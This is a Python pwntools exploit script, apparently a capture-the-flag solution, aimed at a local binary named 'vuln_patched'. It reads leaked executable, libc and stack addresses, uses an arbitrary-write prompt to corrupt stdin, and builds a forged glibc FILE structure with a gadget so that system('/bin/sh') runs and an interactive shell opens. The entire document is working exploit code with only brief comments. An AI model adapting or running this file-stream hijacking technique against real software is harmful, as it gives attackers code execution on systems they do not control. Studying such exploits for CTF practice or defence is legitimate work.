#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
"""
gdb.attach(p,gdbscript='''
           brva 0x00000000000012E4
           brva 0x0000000000001318
           ''')
"""
exe.address = int((b'0x' + p.recvuntil(b'-')[:-1]),16)
log.info(f'exe: {hex(exe.address)}')

p.recvlines(8)
libc.address = int((b'0x' + p.recvuntil(b'-')[:-1]),16)
log.info(f'libc {hex(libc.address)}')
p.recvuntil(b'Here is an extra: ')
stack_leak = int(p.recvline()[:-1],16) 
log.info(f'stack: {hex(stack_leak)}')
log.info(f'stdin: {hex(libc.sym._IO_2_1_stdin_)}')
log.info(f'stdout: {hex(libc.sym._IO_2_1_stdout_)}')

_IO_stdfile_0_lock = 0x240720 + libc.address
_IO_wide_data_0 = 0x23e9c0

val = ((libc.sym._IO_2_1_stdout_ + 0x300) & 0xff00) >> 8

input()
p.sendlineafter(b'Where: ',str(libc.sym._IO_2_1_stdin_+0x41))
p.sendafter(b'What: ',p8(val))


stdout_lock = libc.address + 0x240710   # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x000000000014a870 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh'.ljust(8,b'\x00'))  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)


payload = b'a'*5 + p64(_IO_stdfile_0_lock) + p64(0xffffffffffffffff) + p64(0) + p64(_IO_wide_data_0 + libc.address) + p64(0)*3 + p64(0x00000000ffffffff) 
payload += p64(0)*2 + p64(libc.sym._IO_file_jumps)
payload = payload.ljust(0xc5d,b'a') + bytes(fake)

p.send(payload)
p.interactive()
